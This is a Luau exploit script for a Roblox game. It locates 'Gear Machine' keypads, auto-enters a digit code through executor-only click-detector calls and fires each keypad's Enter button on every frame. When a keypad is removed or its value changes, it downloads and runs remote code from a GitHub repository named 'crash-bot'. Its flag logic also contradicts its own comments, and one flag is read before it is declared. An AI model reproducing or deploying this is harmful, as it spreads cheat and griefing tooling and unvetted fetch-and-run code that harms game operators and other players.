-- Function to find all Gear Machine Keypads
local function findGearMachineKeypads()
    local keypads = {}

    -- Recursive function to search within services or models
    local function search(container)
        for _, object in ipairs(container:GetChildren()) do
            if object:IsA("Model") and object.Name == "Gear Machine" then
                local keypad = object:FindFirstChild("Keypad") -- Adjust "Keypad" if needed
                if keypad then
                    table.insert(keypads, keypad)
                end
            end

            if object:IsA("Model") or object:IsA("Folder") then
                search(object)
            end
        end
    end

    -- Search relevant containers
    search(game.Workspace)


    return keypads
end

-- Get all keypads from Gear Machines
local foundKeypads = findGearMachineKeypads()

-- Monitor each keypad for removal and value changes
for _, keypad in ipairs(foundKeypads) do
    -- Monitor if the keypad is removed
    keypad.AncestryChanged:Connect(function(_, parent)
        if parent == nil then -- Parent becomes nil when the keypad is removed
            loadstring(game:HttpGet("https://raw.githubusercontent.com/n0raxd/crash-bot/refs/heads/main/ggs.luau"))()
        end
    end)

    -- Monitor changes to the "Number" value
    local numberValue = keypad:FindFirstChild("Number")
    if numberValue and numberValue:IsA("IntValue") then
        numberValue.Changed:Connect(function(newValue)
            -- Check if the value change happened after the typegear function
            if typegearRunning then
                loadstring(game:HttpGet("https://raw.githubusercontent.com/n0raxd/crash-bot/refs/heads/main/ggs.luau"))()
                  typegearRunning = false 
            end
        end)
    end
end

-- Existing functionality
local currentKeypad
local typegearRunning = false -- Track if typegear is currently running

function typegear(inputValue)
    if not currentKeypad then
        warn("No keypad selected.")
        return
    end

    typegearRunning = false -- Set flag to true before starting

    for i = 1, #inputValue do
        local buttonName = inputValue:sub(i, i) -- Extract each character
        local button = currentKeypad:FindFirstChild(buttonName) -- Find the button by name

        if button then
            local clickDetector = button:FindFirstChild("RangeC") -- Adjust "RangeC" if needed

            if clickDetector then
                fireclickdetector(clickDetector) -- Fire the click detector
                print("Clicked button '" .. buttonName .. "' on keypad: " .. currentKeypad.Name)
            else
                warn("Click detector 'RangeC' not found in button " .. buttonName)
            end
        else
            warn("Button named '" .. buttonName .. "' not found in the keypad.")
        end
    end

    typegearRunning = true -- Reset the flag after finishing
end

for _, keypad in ipairs(foundKeypads) do
    currentKeypad = keypad -- Set the current keypad
    fireclickdetector(keypad:FindFirstChild("Clear"):FindFirstChild("RangeC"))
    typegear("6418277837") -- Example input sequence, replace with your own
end

local RunService = game:GetService("RunService")

RunService.Heartbeat:Connect(function()
    for _, keypad in ipairs(foundKeypads) do
        fireclickdetector(keypad:FindFirstChild("Enter"):FindFirstChild("RangeC"))
    end
end)
